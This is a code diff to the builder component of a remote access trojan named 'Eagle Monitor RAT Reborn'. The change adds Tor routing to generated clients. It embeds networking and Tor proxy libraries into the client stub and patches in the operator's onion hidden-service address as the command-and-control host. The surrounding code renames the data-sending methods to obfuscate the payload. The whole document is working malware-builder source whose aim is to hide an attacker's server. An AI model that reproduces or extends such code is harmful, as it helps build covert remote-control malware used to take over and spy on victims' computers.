@@ -23,7 +23,11 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 Program.mainForm.buildLogsGuna2TextBox.Clear();
                 string stub = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.cs");
 
-                string xmlConfig = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.xml");
+                string xmlConfig = "";
+                if (Program.settings.torRouting)
+                    xmlConfig = File.ReadAllText(Application.StartupPath + "\\Stubs\\clientTor.xml");
+                else
+                    xmlConfig = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.xml");
                 string archi = xmlConfig.Replace("anycpu", Program.mainForm.archiGuna2ComboBox.Text);
                 File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.xml", archi);
                 //Doing patch
@@ -34,6 +38,24 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 LogStep("Adding packet lib..." + Environment.NewLine);
                 stub = ReplaceStub(stub, "byte[] packetLib = new byte[] { };", "byte[] packetLib = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\PacketLib.dll")));
 
+                // Tor Build
+                if (Program.settings.torRouting)
+                { 
+                    LogStep("Adding Tor Libs..." + Environment.NewLine);
+                    stub = ReplaceStub(stub, "byte[] net = new byte[] { };", "byte[] net = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\System.Net.Http.dll")));
+                    stub = ReplaceStub(stub, "byte[] bridge = new byte[] { };", "byte[] bridge = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\OraclesBridge.dll")));
+                    stub = ReplaceStub(stub, "byte[] aspen = new byte[] { };", "byte[] aspen = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\starksoft.aspen.dll")));
+                    string[] _dirs = Directory.GetDirectories(Application.StartupPath + "\\TORFiles\\TorExtracted");
+                    string _ = "";
+                    foreach (string _dir in _dirs)
+                        if (_dir.Contains("tor"))
+                            _ = _dir;
+                    string onionHost = File.ReadAllText($"{_}\\Data\\Tor\\HiddenService\\hostname");
+                    MessageBox.Show(onionHost);
+                    stub = ReplaceStub(stub, "onionHost = \"\"", $"onionHost = \"{onionHost.Replace("\n","").Trim()}:{Program.settings.torPort}\"");
+                    stub = ReplaceStub(stub, "torRoute = false", "torRoute = true");
+                }
+                //
                 LogStep("Patching hosts..." + Environment.NewLine);
                 string hostsList = null;
 
@@ -101,6 +123,8 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 stub = Rename(stub, "SendDataAsync");
                 stub = Rename(stub, "sendDataAsync");
                 stub = Rename(stub, "SendData");
+                //    stub = Rename(stub, "StartProxy");
+                //    stub = Rename(stub, "Proxify");
 
                 File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.cs", stub);
 
